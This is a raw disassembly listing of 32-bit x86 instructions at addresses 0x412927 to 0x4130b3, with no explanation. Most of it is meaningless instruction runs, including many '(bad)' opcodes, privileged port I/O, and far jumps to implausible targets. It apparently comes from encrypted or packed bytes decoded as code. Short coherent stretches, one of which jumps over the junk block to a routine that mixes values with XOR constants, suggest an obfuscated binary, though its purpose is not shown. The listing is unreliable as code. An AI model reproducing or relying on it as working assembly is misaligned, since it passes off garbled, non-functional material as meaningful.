  412927:	loop   0x412975
  412929:	nop
  41292a:	cmp    DWORD PTR [ebx-0x26],edx
  41292d:	xchg   BYTE PTR [esi],cl
  41292f:	mov    ds:0xc77a05f6,eax
  412934:	out    dx,eax
  412935:	fdiv   QWORD PTR [edx+0x68ee0fa5]
  41293b:	je     0x4128d3
  41293d:	imul   esi,DWORD PTR [esp+ecx*1+0xe2edf43],0xffffffb7
  412945:	in     al,dx
  412946:	push   cs
  412947:	pop    ds
  412948:	dec    ebp
  412949:	(bad)  
  41294a:	or     al,BYTE PTR [ebx]
  41294c:	xchg   DWORD PTR [ebp-0x3028f3e9],esi
  412952:	scas   eax,DWORD PTR es:[edi]
  412953:	xlat   BYTE PTR ds:[ebx]
  412954:	call   0x8bc7641a
  412959:	push   0xffffff99
  41295b:	mov    cl,0x96
  41295d:	in     al,0x2c
  41295f:	push   ecx
  412960:	repz jbe 0x4128fc
  412963:	(bad)  
  412964:	call   0xd14d42d8
  412969:	xchg   ebp,eax
  41296a:	push   eax
  41296b:	adc    ebx,esi
  41296d:	push   esi
  41296e:	add    dh,ah
  412970:	vsubps ymm2,ymm0,YMMWORD PTR [eax-0x1833dfa7]
  412978:	lods   eax,DWORD PTR ds:[esi]
  412979:	ins    BYTE PTR es:[edi],dx
  41297a:	ds pop ebx
  41297c:	das    
  41297d:	nop
  41297e:	outs   dx,BYTE PTR ds:[esi]
  41297f:	or     eax,0x38399087
  412984:	xchg   esi,eax
  412985:	aaa    
  412986:	inc    ebx
  412987:	dec    ebp
  412988:	iret   
  412989:	xchg   edx,eax
  41298a:	mov    ebp,0x8b568008
  41298f:	inc    eax
  412990:	test   eax,0x5097d380
  412995:	push   edi
  412996:	test   eax,0x935cedf6
  41299b:	push   0x3f
  41299d:	or     BYTE PTR [edi],bh
  41299f:	pop    es
  4129a0:	adc    BYTE PTR [esi],bh
  4129a2:	repnz out 0x96,eax
  4129a5:	icebp  
  4129a6:	mov    eax,0xc51d418b
  4129ab:	pop    ss
  4129ac:	pop    edx
  4129ad:	inc    BYTE PTR [ebx*2+0x603db8fd]
  4129b4:	sbb    al,0x3
  4129b6:	push   esi
  4129b7:	mov    ebx,0x32ece7a1
  4129bc:	into   
  4129bd:	mov    ss,WORD PTR [ecx+0x1a]
  4129c0:	shl    BYTE PTR [ebp-0x592c8af8],cl
  4129c6:	inc    edi
  4129c7:	cdq    
  4129c8:	add    BYTE PTR [ebp-0x463ac142],bh
  4129ce:	jno    0x41296a
  4129d0:	pop    ebx
  4129d1:	mov    ebx,0x12d241fe
  4129d6:	dec    ebx
  4129d7:	das    
  4129d8:	test   DWORD PTR [ecx+eax*8+0x2a674252],0x344deb2f
  4129e3:	xchg   ebx,eax
  4129e4:	jg     0x412a36
  4129e6:	out    0x4c,eax
  4129e8:	pop    ds
  4129e9:	lahf   
  4129ea:	repz popf 
  4129ec:	jno    0x412972
  4129ee:	add    BYTE PTR [ebp-0x79],cl
  4129f1:	jle    0x412a71
  4129f3:	mov    ebx,0x511ae390
  4129f8:	push   esi
  4129f9:	or     eax,0x96fe59e1
  4129fe:	rol    edi,1
  412a00:	mov    ebx,DWORD PTR [ebx]
  412a02:	scas   al,BYTE PTR es:[edi]
  412a03:	int    0xfe
  412a05:	popf   
  412a06:	push   cs
  412a07:	cmc    
  412a08:	pop    ecx
  412a09:	pop    edi
  412a0a:	sar    DWORD PTR [esi-0x295dacca],1
  412a10:	dec    edi
  412a11:	xor    eax,0x48e9e3dc
  412a16:	add    DWORD PTR cs:[edx+0x18122bb4],0x2a445d9f
  412a21:	or     DWORD PTR [edx+ebx*2-0x53],edx
  412a25:	xchg   ecx,eax
  412a26:	in     eax,dx
  412a27:	sbb    ch,BYTE PTR [edi]
  412a29:	iret   
  412a2a:	or     ah,BYTE PTR [ebx+ecx*2]
  412a2d:	mov    ebp,0xd0697431
  412a32:	sbb    BYTE PTR [edi+0x1a],ah
  412a35:	or     BYTE PTR [esi],dh
  412a37:	add    al,0x19
  412a39:	addr16 pop edx
  412a3b:	frstor [ebx]
  412a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a3e:	push   eax
  412a3f:	push   ebp
  412a40:	and    al,0x2
  412a42:	mov    ebp,0x3d97b8d1
  412a47:	pop    ds
  412a48:	popf   
  412a49:	xor    BYTE PTR [esi+ebp*4],0x79
  412a4d:	call   0xba13:0xabbd1a74
  412a54:	dec    ebp
  412a55:	push   0x9ea893b8
  412a5a:	sub    ebp,DWORD PTR [ebp+0x30]
  412a5d:	mov    ds,WORD PTR [esi]
  412a5f:	ret    
  412a60:	pop    ebp
  412a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a62:	pop    ebp
  412a63:	xor    eax,0xfe333ef7
  412a68:	pop    DWORD PTR [ebp+0x4561391b]
  412a6e:	sti    
  412a6f:	lods   eax,DWORD PTR ds:[esi]
  412a70:	fsubr  DWORD PTR ss:[eax+0x53bd4f99]
  412a77:	push   es
  412a78:	adc    ch,BYTE PTR [ecx-0x10bef6f8]
  412a7e:	hlt    
  412a7f:	test   eax,0xbea47987
  412a84:	cld    
  412a85:	add    cl,BYTE PTR [edi+0x3ccc51d8]
  412a8b:	icebp  
  412a8c:	mov    dl,0xf
  412a8e:	neg    ch
  412a90:	jne    0x412aba
  412a92:	bound  esi,QWORD PTR [ebx+0x3fcf1357]
  412a98:	pop    esp
  412a99:	mov    edx,0xa6863d73
  412a9e:	push   ecx
  412a9f:	in     al,dx
  412aa0:	xchg   edx,eax
  412aa1:	leave  
  412aa2:	cmp    ch,BYTE PTR [eax+0x7a]
  412aa5:	mov    eax,ds:0x138d1a96
  412aaa:	xchg   ebx,eax
  412aab:	and    DWORD PTR [eax],ebp
  412aad:	ja     0x412ad7
  412aaf:	and    eax,0x40f8fe03
  412ab4:	shl    DWORD PTR [edi+0x32],1
  412ab7:	(bad)  
  412ab8:	jp     0x412a98
  412aba:	das    
  412abb:	sti    
  412abc:	xor    bh,BYTE PTR [eax+edi*2]
  412abf:	xor    eax,0x99a77e26
  412ac4:	push   cs
  412ac5:	ja     0x412ad9
  412ac7:	push   0xdc0cbdb6
  412acc:	cmp    al,0xcc
  412ace:	ins    DWORD PTR es:[edi],dx
  412acf:	aaa    
  412ad0:	(bad)  
  412ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ad2:	push   ss
  412ad3:	into   
  412ad4:	xor    DWORD PTR [ebx],edi
  412ad6:	imul   esi,ebp,0xd1aa64c9
  412adc:	int    0x77
  412ade:	fsub   DWORD PTR [esi+0x20d9c9bf]
  412ae4:	push   es
  412ae5:	imul   ecx,DWORD PTR [ebp-0x7b],0x700ea1f8
  412aec:	and    DWORD PTR [ebx],ebx
  412aee:	ins    BYTE PTR es:[edi],dx
  412aef:	ins    DWORD PTR es:[edi],dx
  412af0:	icebp  
  412af1:	rol    DWORD PTR [esi+0x4c],cl
  412af4:	push   edx
  412af5:	in     eax,dx
  412af6:	jecxz  0x412b05
  412af8:	aam    0x1d
  412afa:	div    BYTE PTR [edx+0xf2a027d]
  412b00:	cdq    
  412b01:	xchg   ecx,eax
  412b02:	pop    ds
  412b03:	add    BYTE PTR [esi],bl
  412b05:	mov    ecx,0xe02d3d28
  412b0a:	push   ebp
  412b0b:	mov    esi,0x53c1e6ee
  412b10:	mov    dh,0xf3
  412b12:	sbb    DWORD PTR [edx+ecx*2+0x27],0xc81b5089
  412b1a:	lods   eax,DWORD PTR ds:[esi]
  412b1b:	in     al,dx
  412b1c:	pusha  
  412b1d:	ins    WORD PTR es:[edi],dx
  412b1f:	(bad)  
  412b21:	loopne 0x412ad0
  412b23:	iret   
  412b24:	ror    BYTE PTR [eax+0x2030a1da],cl
  412b2a:	ja     0x412ab6
  412b2c:	in     eax,dx
  412b2d:	pop    eax
  412b2e:	cmp    BYTE PTR [edi-0x28002734],cl
  412b34:	std    
  412b35:	sbb    ecx,0xac17a78
  412b3b:	and    ecx,0x6a
  412b3e:	xchg   BYTE PTR [edx-0x28],al
  412b41:	sub    dl,BYTE PTR [edi]
  412b43:	xchg   DWORD PTR [esi-0x4d],edi
  412b46:	and    ah,BYTE PTR [ebp+0xd]
  412b49:	ret    0xf876
  412b4c:	sar    DWORD PTR [edx],cl
  412b4e:	xchg   esi,eax
  412b4f:	push   eax
  412b50:	in     eax,0x98
  412b52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b53:	push   edi
  412b54:	inc    ebp
  412b55:	mov    ebp,0xfa444863
  412b5a:	(bad)  
  412b5b:	xchg   esp,eax
  412b5c:	push   0xffffffcb
  412b5e:	(bad)  
  412b5f:	scas   al,BYTE PTR es:[edi]
  412b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b61:	xchg   edx,eax
  412b62:	icebp  
  412b63:	lods   eax,DWORD PTR ds:[esi]
  412b64:	xor    ch,dl
  412b66:	popf   
  412b67:	stos   BYTE PTR es:[edi],al
  412b68:	inc    eax
  412b69:	pop    sp
  412b6b:	jp     0x412b69
  412b6d:	test   eax,0x92d923a1
  412b72:	pop    esp
  412b73:	xchg   esi,eax
  412b74:	add    eax,0xd0e315f7
  412b79:	mov    ds:0x59f714e3,eax
  412b7e:	ins    DWORD PTR es:[edi],dx
  412b7f:	push   edx
  412b80:	pop    ebp
  412b81:	(bad)  
  412b82:	sahf   
  412b83:	inc    eax
  412b84:	sbb    al,0x6
  412b86:	out    0xbe,al
  412b88:	cli    
  412b89:	leave  
  412b8a:	sub    DWORD PTR ds:0xb6bcac5f,esi
  412b90:	gs xchg ebx,eax
  412b92:	iret   
  412b93:	aaa    
  412b94:	addr16 mov al,0x8b
  412b97:	xor    ah,BYTE PTR [edx]
  412b99:	push   ecx
  412b9a:	in     eax,0xc1
  412b9c:	data16 in al,0x38
  412b9f:	neg    DWORD PTR [ecx+edx*2+0x23]
  412ba3:	cmp    eax,DWORD PTR [edi+ebx*8]
  412ba6:	add    DWORD PTR [ecx+0x2b],esp
  412ba9:	sub    DWORD PTR [esi],ebp
  412bab:	mov    edi,DWORD PTR [edx+esi*8+0x117cb058]
  412bb2:	outs   dx,BYTE PTR ds:[esi]
  412bb3:	mov    ebp,0x1ac5bc76
  412bb8:	inc    esi
  412bb9:	into   
  412bba:	xor    ecx,DWORD PTR [ebx-0x29bff516]
  412bc0:	scas   eax,DWORD PTR es:[edi]
  412bc1:	ror    BYTE PTR [ebp+0x76],1
  412bc4:	dec    ebp
  412bc5:	jne    0x412b52
  412bc7:	repz imul ebp,edi,0xffffff83
  412bcb:	add    eax,0xdc05a7c3
  412bd0:	push   DWORD PTR [ebx]
  412bd2:	or     eax,0x8becb001
  412bd7:	(bad)  
  412bd8:	pop    eax
  412bd9:	xor    ah,BYTE PTR [edi]
  412bdb:	push   edi
  412bdc:	jl     0x412bd6
  412bde:	xlat   BYTE PTR ds:[ebx]
  412bdf:	inc    edi
  412be0:	xchg   ah,ah
  412be2:	jmp    0x2ce40f61
  412be7:	sub    eax,0x4bc5ec41
  412bec:	push   ds
  412bed:	fwait
  412bee:	in     eax,dx
  412bef:	aaa    
  412bf0:	add    BYTE PTR [ecx-0x53002b08],bh
  412bf6:	out    0x49,eax
  412bf8:	int3   
  412bf9:	push   ebp
  412bfa:	inc    edi
  412bfb:	or     BYTE PTR [eax-0x12363d6a],bl
  412c01:	push   esp
  412c02:	in     al,0x8e
  412c04:	mov    ?,WORD PTR gs:[ebp+0x7f]
  412c08:	push   0x57bd09ff
  412c0d:	mov    cl,dh
  412c0f:	pop    eax
  412c10:	cs pop esp
  412c12:	popf   
  412c13:	push   edi
  412c14:	or     eax,0x7448aa5d
  412c19:	in     eax,0xb6
  412c1b:	out    0xb1,al
  412c1d:	or     ecx,DWORD PTR [esi-0x48]
  412c20:	jl     0x412bb7
  412c22:	jo     0x412c43
  412c24:	fsubrp st(1),st
  412c26:	push   ecx
  412c27:	(bad)  
  412c28:	adc    al,0x98
  412c2a:	dec    esi
  412c2b:	mov    ebx,0xb91109b9
  412c30:	setae  BYTE PTR [esi+ebp*1-0x6c]
  412c35:	stos   DWORD PTR es:[edi],eax
  412c36:	push   ds
  412c37:	jno    0x412bdc
  412c39:	and    eax,0x37add150
  412c3e:	mov    ebx,0x7524c089
  412c43:	stos   DWORD PTR es:[edi],eax
  412c44:	imul   edi,eax,0xdb528cd0
  412c4a:	test   BYTE PTR [esp+0x637cb87],dh
  412c51:	push   ebp
  412c52:	or     eax,0xfe40f379
  412c57:	xchg   BYTE PTR [eax+0x68],dl
  412c5a:	xor    eax,0xe100a447
  412c5f:	and    ch,bl
  412c61:	mov    ecx,0x3640be4a
  412c66:	lock aas 
  412c68:	jo     0x412cb6
  412c6a:	lods   al,BYTE PTR ds:[esi]
  412c6b:	push   ss
  412c6c:	sbb    ecx,DWORD PTR [ebx+0x4d8bf845]
  412c72:	cld    
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0x7c774774
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [esi-0x59],cl
  412caf:	xchg   ebx,eax
  412cb0:	fdivp  st(1),st
  412cb2:	aam    0xa5
  412cb4:	gs pop es
  412cb6:	add    ebp,edx
  412cb8:	mov    es,WORD PTR [edi]
  412cba:	leave  
  412cbb:	mov    bh,0x34
  412cbd:	mov    dh,0x9f
  412cbf:	sub    ebx,DWORD PTR [ecx]
  412cc1:	dec    esp
  412cc2:	mov    ?,WORD PTR [edi]
  412cc4:	lods   eax,DWORD PTR ds:[esi]
  412cc5:	xor    edi,DWORD PTR [ecx+0x6ba08a4]
  412ccb:	mov    esi,DWORD PTR [ebp+0x5e5b4d37]
  412cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cd2:	fcmovnbe st,st(3)
  412cd4:	pop    edi
  412cd5:	xchg   esp,eax
  412cd6:	add    dl,al
  412cd8:	mov    eax,ds:0x6d26e7da
  412cdd:	push   es
  412cde:	add    esp,edx
  412ce0:	lods   eax,DWORD PTR ds:[esi]
  412ce1:	jl     0x412ce6
  412ce3:	mov    edi,0xc5ab437d
  412ce8:	mov    ?,WORD PTR [edi+0x4a5cdecf]
  412cee:	aad    0x2f
  412cf0:	imul   eax,eax,0xffffff87
  412cf3:	sahf   
  412cf4:	ret    
  412cf5:	sub    eax,0x5c39c64b
  412cfa:	mov    ebx,0x3c12e70
  412cff:	lahf   
  412d00:	in     al,0xb5
  412d02:	dec    esp
  412d03:	popa   
  412d04:	jp     0x412cc4
  412d06:	arpl   cx,dx
  412d08:	xlat   BYTE PTR ds:[ebx]
  412d09:	mov    bh,0x8c
  412d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d0c:	xchg   esp,eax
  412d0d:	ret    0xe412
  412d10:	jb     0x412d3e
  412d12:	outs   dx,BYTE PTR ds:[esi]
  412d13:	jge    0x412d58
  412d15:	sar    BYTE PTR [edi-0x2f],0x3c
  412d19:	push   esp
  412d1a:	mov    ds:0xc884de7,al
  412d1f:	inc    esi
  412d20:	and    DWORD PTR [ebx+0x3a2ff819],0x69f3941c
  412d2a:	pop    eax
  412d2b:	je     0x412d01
  412d2d:	mov    edi,esp
  412d2f:	dec    eax
  412d30:	add    BYTE PTR [edi+ecx*1],ah
  412d33:	or     DWORD PTR [ebx-0x78],esp
  412d36:	add    al,0x25
  412d38:	fwait
  412d39:	xchg   ebp,eax
  412d3a:	pop    ebp
  412d3b:	imul   ebx,DWORD PTR [eax],0xffffffbf
  412d3e:	out    0x98,eax
  412d40:	cdq    
  412d41:	cdq    
  412d42:	or     bh,ah
  412d44:	aam    0xb6
  412d46:	loopne 0x412d31
  412d48:	xchg   edi,eax
  412d49:	pop    ebp
  412d4a:	pop    ss
  412d4b:	ins    DWORD PTR es:[edi],dx
  412d4c:	mov    bh,0xce
  412d4e:	fisubr DWORD PTR ds:0x8518cc60
  412d54:	sub    BYTE PTR [esi],dh
  412d56:	out    dx,al
  412d57:	mov    edx,0x4509f22d
  412d5c:	mov    ebx,0x879d87a5
  412d61:	retf   0x8556
  412d64:	shl    DWORD PTR [esi-0x72],0x50
  412d68:	fbld   TBYTE PTR [ecx-0x42f6f55b]
  412d6e:	inc    ebx
  412d6f:	dec    ebx
  412d70:	mov    edx,DWORD PTR [esi]
  412d72:	adc    eax,0x7e42d82d
  412d77:	repz test al,0x48
  412d7a:	mov    edi,0x4aff6387
  412d7f:	fsubr  st,st(1)
  412d81:	outs   dx,BYTE PTR ds:[esi]
  412d82:	test   al,0xc0
  412d84:	dec    ecx
  412d85:	xchg   BYTE PTR [esi+eax*4+0x4],dh
  412d89:	int3   
  412d8a:	mov    esi,0xf99a9ff
  412d8f:	inc    esp
  412d90:	inc    ebx
  412d91:	mov    ebp,0xe45f7dfe
  412d96:	adc    BYTE PTR [ebx+0x17ac3e0d],al
  412d9c:	xor    ecx,DWORD PTR [ecx]
  412d9e:	stc    
  412d9f:	ret    0x382a
  412da2:	xchg   esp,eax
  412da3:	lock fwait
  412da5:	jnp    0x412d9b
  412da7:	adc    dh,al
  412da9:	out    dx,al
  412daa:	jbe    0x412d84
  412dac:	inc    ebx
  412dad:	pop    es
  412dae:	adc    DWORD PTR [edi],esp
  412db0:	adc    esp,esi
  412db2:	je     0x412d8b
  412db4:	aas    
  412db5:	sbb    al,0xc4
  412db7:	cmp    DWORD PTR [eax-0x56eb2f3e],ecx
  412dbd:	push   eax
  412dbe:	repz imul edx,DWORD PTR [ecx-0xf],0x7dafbf5
  412dc6:	xlat   BYTE PTR ds:[ebx]
  412dc7:	or     eax,0xa1b2fcf5
  412dcc:	aas    
  412dcd:	sbb    BYTE PTR [ebx-0x31],dh
  412dd0:	(bad)  
  412dd1:	mov    bh,0x79
  412dd3:	mov    edi,0x716a9cbc
  412dd8:	dec    ebp
  412dd9:	xor    al,0xcb
  412ddb:	mov    cl,0x64
  412ddd:	adc    ecx,DWORD PTR [edx]
  412ddf:	in     al,0x5
  412de1:	xlat   BYTE PTR ds:[ebx]
  412de2:	aad    0xfa
  412de4:	inc    esi
  412de5:	push   esp
  412de6:	mov    eax,DWORD PTR [esp+ebp*2+0x1012476]
  412ded:	and    BYTE PTR [ebp-0x174c838b],bh
  412df3:	jno    0x412dc7
  412df5:	mov    esp,0xe376c3d5
  412dfa:	or     al,ah
  412dfc:	std    
  412dfd:	xor    edx,ebp
  412dff:	mov    al,0xfe
  412e01:	stos   BYTE PTR es:[edi],al
  412e02:	xor    dl,BYTE PTR [ebx+eiz*2-0x64]
  412e06:	mov    edx,0x32fe8b5b
  412e0b:	scas   eax,DWORD PTR es:[edi]
  412e0c:	xchg   esp,eax
  412e0d:	jmp    0x2534:0x973411d5
  412e14:	sub    BYTE PTR [esi],ah
  412e16:	enter  0x9757,0x3b
  412e1a:	xchg   ebp,eax
  412e1b:	or     ecx,edx
  412e1d:	sbb    BYTE PTR [edi+0x41],bh
  412e20:	test   al,0xca
  412e22:	jg     0x412e7b
  412e24:	sbb    al,0x6e
  412e26:	sahf   
  412e27:	push   es
  412e28:	stos   DWORD PTR es:[edi],eax
  412e29:	ins    BYTE PTR es:[edi],dx
  412e2a:	mov    DWORD PTR [edi+0x25],edx
  412e2d:	xor    eax,0x4ea7a0cb
  412e32:	cs int 0x37
  412e35:	stos   BYTE PTR es:[edi],al
  412e36:	cwde   
  412e37:	cmp    BYTE PTR [edi],0x8f
  412e3a:	mov    eax,0xf59473e
  412e3f:	pop    es
  412e40:	sti    
  412e41:	fadd   DWORD PTR [eax+0x638712d7]
  412e47:	call   0xfbe3:0xe9dbb0f2
  412e4e:	push   edi
  412e4f:	leave  
  412e50:	mov    dh,0x9b
  412e52:	and    edi,ebx
  412e54:	pop    es
  412e55:	pop    es
  412e56:	mov    ch,0x28
  412e58:	call   0x984bdf90
  412e5d:	les    ebx,FWORD PTR [eax+0x615cb969]
  412e63:	ret    
  412e64:	dec    ebx
  412e65:	xchg   DWORD PTR [esi],eax
  412e67:	sbb    esp,DWORD PTR [ecx]
  412e69:	pop    ss
  412e6a:	cmp    al,0xa6
  412e6c:	iret   
  412e6d:	stos   DWORD PTR es:[edi],eax
  412e6e:	rcr    BYTE PTR [eax-0x28ca58e5],cl
  412e74:	loop   0x412e54
  412e76:	push   ebp
  412e77:	mov    ds:0x9f650594,eax
  412e7c:	popf   
  412e7d:	aam    0x89
  412e7f:	lds    edx,FWORD PTR [ebp+0x30]
  412e82:	sbb    DWORD PTR [edx],0x42
  412e85:	jno    0x412ef2
  412e87:	(bad)  
  412e88:	or     al,0xf
  412e8a:	push   ebx
  412e8b:	loope  0x412e78
  412e8d:	mov    eax,0x7f15a40b
  412e92:	and    dl,ch
  412e94:	bswap  eax
  412e96:	cmp    al,0x21
  412e98:	push   cs
  412e99:	add    DWORD PTR [ebp-0x29],ebp
  412e9c:	neg    DWORD PTR [ecx-0x7f]
  412e9f:	xchg   ecx,eax
  412ea0:	mov    DWORD PTR [eax-0x32],esi
  412ea3:	ficom  WORD PTR [eax]
  412ea5:	push   ebp
  412ea6:	in     al,dx
  412ea7:	xchg   ebp,eax
  412ea8:	or     DWORD PTR [esi],ebx
  412eaa:	xor    eax,0x27de97a7
  412eaf:	sti    
  412eb0:	jns    0x412e94
  412eb2:	push   cs
  412eb3:	sbb    DWORD PTR [edx+0x6],ecx
  412eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eb7:	popa   
  412eb8:	xor    DWORD PTR [eax+eax*8-0x45],esp
  412ebc:	(bad)  
  412ebe:	mov    dl,0x9
  412ec0:	sub    ebx,DWORD PTR [esi+eax*8]
  412ec3:	clc    
  412ec4:	shl    DWORD PTR [eax],0xf2
  412ec7:	stos   DWORD PTR es:[edi],eax
  412ec8:	scas   al,BYTE PTR es:[edi]
  412ec9:	and    bl,dh
  412ecb:	aas    
  412ecc:	mov    al,0xf7
  412ece:	gs (bad) 
  412ed0:	adc    ecx,DWORD PTR [edi]
  412ed2:	pop    ebp
  412ed3:	jecxz  0x412f08
  412ed5:	push   0x5dd1dd8
  412eda:	and    al,0xf9
  412edc:	loop   0x412f49
  412ede:	pop    edi
  412edf:	cmp    DWORD PTR [edi+0x7b33e6a8],eax
  412ee5:	retf   
  412ee6:	pop    ebp
  412ee7:	or     DWORD PTR [ebx+0x4db745e2],edx
  412eed:	jl     0x412f3c
  412eef:	pop    ss
  412ef0:	(bad)  
  412ef1:	aaa    
  412ef2:	js     0x412ecf
  412ef4:	cwde   
  412ef5:	mov    edx,0xcb0bffb8
  412efa:	xchg   DWORD PTR [edi+0x6978c96c],esi
  412f00:	mov    ebp,0x5a0de892
  412f05:	(bad)  
  412f06:	in     eax,0x69
  412f08:	adc    eax,0x17440b76
  412f0d:	inc    ecx
  412f0e:	loopne 0x412f7c
  412f10:	adc    DWORD PTR [ebx+0x5c90b9db],ebp
  412f16:	inc    ebx
  412f17:	faddp  st(5),st
  412f1a:	(bad)  
  412f1b:	sub    al,0xf2
  412f1d:	pop    esp
  412f1e:	and    al,0x46
  412f20:	in     al,0xd6
  412f22:	pop    ds
  412f23:	cli    
  412f24:	mov    ah,0x6d
  412f26:	cmp    BYTE PTR [eax-0x696ac156],0x9
  412f2d:	inc    ebx
  412f2e:	jl     0x412f49
  412f30:	push   ebx
  412f31:	ret    0xcd9b
  412f34:	scas   eax,DWORD PTR es:[edi]
  412f35:	and    ch,BYTE PTR [ecx-0x41]
  412f38:	fcmovnu st,st(1)
  412f3a:	test   dl,al
  412f3c:	push   edx
  412f3d:	sbb    bh,BYTE PTR [eax-0x51d6f812]
  412f43:	mov    dl,0x27
  412f45:	xchg   esi,eax
  412f46:	dec    esp
  412f47:	pop    DWORD PTR [ebp+esi*1+0x3c20a2cb]
  412f4e:	(bad)  
  412f50:	out    0x18,al
  412f52:	dec    eax
  412f53:	and    edi,DWORD PTR [edx]
  412f55:	dec    ebp
  412f56:	std    
  412f57:	nop
  412f58:	dec    ecx
  412f59:	jnp    0x412f13
  412f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f5c:	sbb    ebx,DWORD PTR [ebx]
  412f5e:	pop    esi
  412f5f:	neg    BYTE PTR [edi+0x5774cf6f]
  412f65:	push   ss
  412f66:	pop    ebx
  412f67:	repz pop eax
  412f69:	xchg   ebp,eax
  412f6a:	(bad)  
  412f6b:	adc    edi,DWORD PTR [edi]
  412f6d:	xor    cl,cl
  412f6f:	pop    eax
  412f70:	retf   0x6f17
  412f73:	and    bl,cl
  412f75:	mov    cl,0x86
  412f77:	loop   0x412f67
  412f79:	loope  0x412f77
  412f7b:	inc    ebp
  412f7c:	aad    0x11
  412f7e:	jp     0x412f83
  412f80:	ins    BYTE PTR es:[edi],dx
  412f81:	test   BYTE PTR ds:0x1a8a3423,ch
  412f87:	mov    ds:0x9366abcf,eax
  412f8c:	lock imul edx,DWORD PTR ss:[esi-0x23],0xffffff94
  412f92:	stos   BYTE PTR es:[edi],al
  412f93:	fild   WORD PTR [esi-0x53]
  412f96:	into   
  412f97:	fadd   QWORD PTR [edi-0x55c66689]
  412f9d:	test   BYTE PTR [ebp+0x79fe065a],0xe3
  412fa4:	mov    cl,0x22
  412fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fa7:	div    BYTE PTR [ebp-0xff83fe]
  412fad:	(bad)  
  412fae:	mov    esp,DWORD PTR [edi]
  412fb0:	pushf  
  412fb1:	fwait
  412fb2:	addr16 js 0x412fb6
  412fb5:	jl     0x41302e
  412fb7:	mov    al,0x21
  412fb9:	ins    DWORD PTR es:[edi],dx
  412fba:	ror    DWORD PTR [esi],0x5b
  412fbd:	fstp   QWORD PTR [ebp+eiz*2+0x7e6cc1ed]
  412fc4:	sbb    al,0x2c
  412fc6:	adc    dl,BYTE PTR [edi]
  412fc8:	and    DWORD PTR [edx-0x262a06a],ebx
  412fce:	les    edi,FWORD PTR ds:0x5f7ddeee
  412fd4:	(bad)  
  412fd5:	out    dx,eax
  412fd6:	stos   BYTE PTR es:[edi],al
  412fd7:	cmp    cl,cl
  412fd9:	push   edx
  412fda:	dec    BYTE PTR [esi+0x67dc9165]
  412fe0:	inc    ebp
  412fe1:	lods   eax,DWORD PTR ds:[esi]
  412fe2:	add    al,0x24
  412fe4:	sbb    al,0xf3
  412fe6:	pop    eax
  412fe7:	leave  
  412fe8:	int    0x17
  412fea:	das    
  412feb:	ins    DWORD PTR es:[edi],dx
  412fec:	mov    eax,ds:0xe4e34dbd
  412ff1:	pop    esi
  412ff2:	sbb    eax,0xa2baf22d
  412ff7:	in     eax,dx
  412ff8:	icebp  
  412ff9:	or     bl,ch
  412ffb:	dec    ebx
  412ffc:	xchg   edi,eax
  412ffd:	or     DWORD PTR [ebp-0x16],ebx
  413000:	call   0xe3:0x6d450b72
  413007:	sub    BYTE PTR [edi+0x70],dl
  41300a:	shl    DWORD PTR [edi+0x50],1
  41300d:	jmp    0xd12c4a82
  413012:	out    0xb9,eax
  413014:	push   esi
  413015:	test   DWORD PTR [edi+0x7e],edi
  413018:	aaa    
  413019:	pusha  
  41301a:	jne    0x413060
  41301c:	jnp    0x413086
  41301e:	ja     0x413019
  413020:	mov    ah,0x1
  413022:	pop    ebx
  413023:	dec    esi
  413024:	push   eax
  413025:	cmc    
  413026:	push   ebx
  413027:	fadd   QWORD PTR [ebx-0x520ca990]
  41302d:	or     DWORD PTR [ecx-0x47],eax
  413030:	in     al,dx
  413031:	push   edi
  413032:	in     al,dx
  413033:	cmp    dl,BYTE PTR [edi-0x6edb6450]
  413039:	jmp    0x2f7c:0x3c2b1563
  413040:	xlat   BYTE PTR ds:[ebx]
  413041:	rol    DWORD PTR [ebx-0x76b225ff],1
  413047:	lods   al,BYTE PTR ds:[esi]
  413048:	int    0xbb
  41304a:	push   es
  41304b:	jmp    0xd2035a8b
  413050:	imul   esp,DWORD PTR [eax+eiz*8]
  413054:	mov    ebx,0xd016e878
  413059:	mov    eax,ds:0xfefda88c
  41305e:	out    0x29,al
  413060:	in     al,0x6
  413062:	in     eax,dx
  413063:	sbb    eax,0x188b4da5
  413068:	push   ecx
  413069:	push   eax
  41306a:	call   0x42202e
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
